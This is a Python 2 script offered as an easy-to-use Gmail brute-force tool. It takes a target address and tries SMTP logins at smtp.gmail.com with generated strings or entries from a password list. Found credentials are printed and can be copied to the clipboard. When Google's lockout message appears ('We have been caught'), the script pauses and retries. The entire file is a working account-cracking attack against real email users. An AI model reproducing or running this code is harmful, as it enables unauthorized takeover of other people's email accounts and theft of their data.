import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
import time
import itertools
import subprocess
import smtplib
import getpass
def cls():
    print "\n"*50
    subprocess.call("cls", shell=True)

def WordGenBrute(StealGmail):
    import itertools
    def passes(size, pool):
        for p in itertools.product(pool, repeat=size):
            yield "".join(p)
    def range_passes(minSize, maxSize, pool):
        num = (maxSize - minSize) + 1
        pws = []
        for i in range(num):
            pws.append(passes(minSize + i, pool))
        for P in pws:
            for pw in P:
                yield pw
    import string
    from optparse import OptionParser
    try:
        dPool = "password1234567890qwertyuifghjklzxcvbnm!*$@#&^()PASSWORDQWERTYUIOPASDFGHJKLZXCVBNM\"?><|}{\\=+-_"
        parser = OptionParser()
        parser.add_option("-s", "--start", dest="minSize", type="int", default=int(raw_input("Minimum Size of the Password | > ")),
                          help="Minimum password size")
        parser.add_option("-e", "--end", dest="maxSize", type="int", default=int(raw_input("Maximum Size of the Password | > ")),
                          help="Maximum password size")
        parser.add_option("-p", "--pool", dest="pool", default=dPool,
                          help="Characters to generate passwords from")
        (options, args) = parser.parse_args()
        nops = 0
    except KeyboardInterrupt:
        print ">------------------------------------------\nWould you like to continue? (y/n)" + "\n" + "-"*45
        yeahNo = raw_input("> ")
        if "y" in yeahNo.lower():
            pass
        else:
            launchAttackType()
    except Exception,e:
        print ">" + "-"*75
        print "[Error]: | " + str(e) + "\nPlease Report This Error To The Creator of this Script if it continues! Thank you."
        print ">" + "-"*75
        raw_input("> ")
        launchAttackType()
    for pw in range_passes(options.minSize, options.maxSize, options.pool):
        nops = nops + 1
        print "[Trying] | " + pw + " | Pass Number: " + str(nops) 
        SMTP_SERVER = 'smtp.gmail.com'
        SMTP_PORT = 587
        session = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        Steal = StealGmail
        Pass = (str(pw))
        password = Pass
        try:
            session.ehlo()
            session.starttls()
            session.ehlo
            session.login(Steal, password)
            session.quit()
            subprocess.call("color 0a", shell=True)
            cls()
            print "-------------------------"
            print "BruteForce Sucessful: "
            print "---------------------"
            print "Gmail: " + Steal
            print "Password: " + Pass
            print "-------------------------"
            aans = raw_input("Copy to Clipboard? (y/n)\n> ")
            if "y" in aans.lower():
                data = "Username: | " + Steal + "  |  Password: | " + Pass
                subprocess.call("echo '%s' | pbcopy" % data, shell=True)
                launchAttackType()
            else:
                launchAttackType()
            launchAttackType()
        except KeyboardInterrupt:
            print ">------------------------------------------\nWould you like to continue? (y/n)" + "\n" + "-"*45
            yeahNo = raw_input("> ")
            if "y" in yeahNo.lower():
                pass
            else:
                launchAttackType()
        except Exception, e:
            if "not accepted" in str(e):
                pass
            elif "log in with your web browser and then try aga" in str(e):
                print ">" + "-"*70 + "\n> We have been caught, lets wait for 30 Seconds then retry...\n" + ">" + "-"*70
                time.sleep(30)
            else:  
                print str(e)
                raw_input("> ")
    print "-"*75
    print "Unable To Crack The Password(Details): "
    print "-"*45
    print "[Gmail]: | " + Steal
    print "[Reason]: | " + str(e)
    print "-"*75
    raw_input("> ")
    launchAttackType()

    
def PassListBrute(StealGmail):
    import itertools
    def passes(size, pool):
        for p in itertools.product(pool, repeat=size):
            yield "".join(p)
    def range_passes(minSize, maxSize, pool):
        num = (maxSize - minSize) + 1
        pws = []
        for i in range(num):
            pws.append(passes(minSize + i, pool))
        for P in pws:
            for pw in P:
                yield pw
    import string
    from optparse import OptionParser
    print """Password List Directory:
>------------------------------------------------------
> (Example): C:\\list\\common\\favoriteList\\
> (Do Not Add File Name)
>----------------------------------------------"""
    listdir = raw_input("> ")
    cls()
    print """Password List Name:
>----------------------------------------
> (Example): password.txt
> (Do Not Add List Directory)
>---------------------------------"""
    listnam = raw_input("> ")
    cls()
    listname = listdir + "\\" + listnam
    print "-"*75 + "\n> File Chosen: " + listname
    print """>------------------------------------------------------------------------------
> Attack Starting...
>-----------------------------------
"""
    f=open(listname)
    lines=f.readlines()
    dPool = lines
    parser = OptionParser()
    parser.add_option("-p", "--pool", dest="pool", default=dPool,
                      help="List to generate passwords from")
    (options, args) = parser.parse_args()
    nops = 0
    for pw in range_passes(1, 1, options.pool):
        nops = nops + 1
        print "[Trying] | " + pw.strip("\n") + " | Pass Number: " + str(nops) 
        SMTP_SERVER = 'smtp.gmail.com'
        SMTP_PORT = 587
        session = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
        Steal = StealGmail
        Pass = (str(pw))
        password = Pass
        try:
            session.ehlo()
            session.starttls()
            session.ehlo
            session.login(Steal, password)
            session.quit()
            #If this point is reached, Pass was found
            subprocess.call("color 0a", shell=True)
            cls()
            print "-------------------------------------------------------"
            print "Brute-Force Sucessful: "
            print "---------------------------------"
            print "Gmail: " + Steal
            print "Password: " + Pass
            print "---------------------------------"
            aans = raw_input("Copy to Clipboard? (y/n)\n> ")
            if "y" in aans.lower():
                data = "Username: | " + Steal + "  |  Password: | " + Pass
                subprocess.call("echo '%s' | pbcopy" % data, shell=True)
                launchAttackType()
            else:
                launchAttackType()
        except KeyboardInterrupt:
            print ">------------------------------------------\nWould you like to continue? (y/n)" + "\n" + "-"*45
            yeahNo = raw_input("> ")
            if "y" in yeahNo.lower():
                pass
            else:
                launchAttackType()
        except Exception, e:
            if "not accepted" in str(e):
                pass
            elif "log in with your web browser and then try aga" in str(e):
                print ">" + "-"*70 + "\n> We have been caught, lets wait for 30 Seconds then retry...\n" + ">" + "-"*70
                time.sleep(30)
            else:  
                print str(e)
                raw_input("> ")
    print "-"*75
    print "Unable To Crack The Password(Details): "
    print "-"*45
    print "[Gmail]: | " + Steal
    print "[Directory]: | " + listdir
    print "[List]:  | " + listnam
    print "[Reason]: | " + str(e)
    print "-"*75
    raw_input("> ")
    launchAttackType()


def launchAttackType():
    try:
        cls()
        print """> Windows65's Easy To Use Gmail Brute Force Algorithm
>-------------------------------------------------------------------------
> Please Follow The Instructions Given To Start A Brute Force Attack.
>---------------------------------------------------------------------
>
> Enter The Gmail You Would Like To Access Below:
>---------------------------------------------------"""
        StealGmail = raw_input("> ")
        cls()
        print """
 What type of Brute Force would you like to attempt?
>---------------------------------------------------------<\\
] >Letter Generator------------------(1)                  <|
] >Password List---------------------(2) (Suggested)     <|
>---------------------------------------------------------</
"""
        answerz = raw_input("> ")
        cls()
        answerz = answerz.strip()
        if answerz == "1":
            print "----------------------------------------------------------"
            print "-               Password Generator                       -"
            print "----------------------------------------------------------"
            cls()
            subprocess.call("color 09", shell=True)
            WordGenBrute(StealGmail)
        elif answerz == "2":
            print "----------------------------------------------------------"
            print "-                  Password List                         -"
            print "----------------------------------------------------------"
            cls()
            subprocess.call("color 09", shell=True)
            PassListBrute(StealGmail)
        else:
            cls()
            print "Invalid Answer, Try again!"
            launchAttackType()
    except KeyboardInterrupt:
        print ">------------------------------------------\nWould you like to continue? (y/n)" + "\n" + "-"*45
        yeahNo = raw_input("> ")
        if "y" in yeahNo.lower():
            launchAttackType()
        else:
            launchAttackType()
    except Exception,e:
        print ">" + "-"*75
        print "[Error]: | " + str(e) + "\nPlease Report This Error To The Creator of this Script if it continues! Thank you.\n> Email to creator Now. (Please Wait): "
        print ">" + "-"*75
        user = getpass.getuser()
        launchAttackType()
launchAttackType()
